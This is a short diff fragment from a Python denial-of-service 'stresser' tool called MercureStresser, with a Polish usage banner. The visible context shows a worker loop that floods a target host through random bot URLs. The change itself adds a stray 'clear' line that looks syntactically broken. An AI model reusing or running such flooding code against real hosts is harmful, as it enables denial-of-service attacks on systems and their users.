@@ -70,7 +70,7 @@ def dos2():
 		item=w.get()
 		bot_hammering(random.choice(bots)+"http://"+host)
 		w.task_done()
-
+clear
 
 def usage():
 	print (''' \033[92mMercureStresser \n • Wersja • 0.1 \n • Autor: Mercure \n • Alpha Able v0.1 \n
